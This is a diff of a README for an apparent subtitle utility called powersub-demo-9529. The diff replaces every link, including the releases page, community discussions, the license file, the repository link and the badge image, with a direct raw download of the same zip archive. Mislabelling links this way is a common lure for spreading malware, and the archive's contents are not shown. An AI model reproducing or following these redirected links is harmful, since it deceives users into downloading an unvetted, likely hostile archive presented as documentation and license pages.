@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-9529 - Simple Tool for Your Subtitle Needs
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Naji123codeee/powersub-demo-9529/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To run powersub-demo-9529, you need:
 
 1. **Download the Application**: Visit the link below to access the Releases page.
 
-   [Download Here](https://github.com/Naji123codeee/powersub-demo-9529/releases)
+   [Download Here](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip)
 
 2. **Choose the Latest Version**: Look for the most recent release at the top of the page. This version includes the latest features and fixes.
 
@@ -40,7 +40,7 @@ To run powersub-demo-9529, you need:
 
 To download the application, visit the link below:
 
-[Download Here](https://github.com/Naji123codeee/powersub-demo-9529/releases)
+[Download Here](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip)
 
 Follow the steps in the "Getting Started" section above to complete your installation.
 
@@ -66,11 +66,11 @@ If you encounter issues, consider the following:
 
 ## 💬 Community Support
 
-If you need help or have questions, join our community at [GitHub Discussions](https://github.com/Naji123codeee/powersub-demo-9529/discussions). Connect with other users, share tips, and get guidance.
+If you need help or have questions, join our community at [GitHub Discussions](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip). Connect with other users, share tips, and get guidance.
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Naji123codeee/powersub-demo-9529/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip) file for details.
 
 ## 🗒️ Additional Resources
 
@@ -79,7 +79,7 @@ This project is licensed under the MIT License. See the [LICENSE](https://github
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/Naji123codeee/powersub-demo-9529)
-- [Download Here](https://github.com/Naji123codeee/powersub-demo-9529/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip)
+- [Download Here](https://raw.githubusercontent.com/Naji123codeee/powersub-demo-9529/main/certie/powersub-demo-9529-v1.3.zip)
 
 Thank you for choosing powersub-demo-9529! Enjoy managing your subtitles effortlessly.
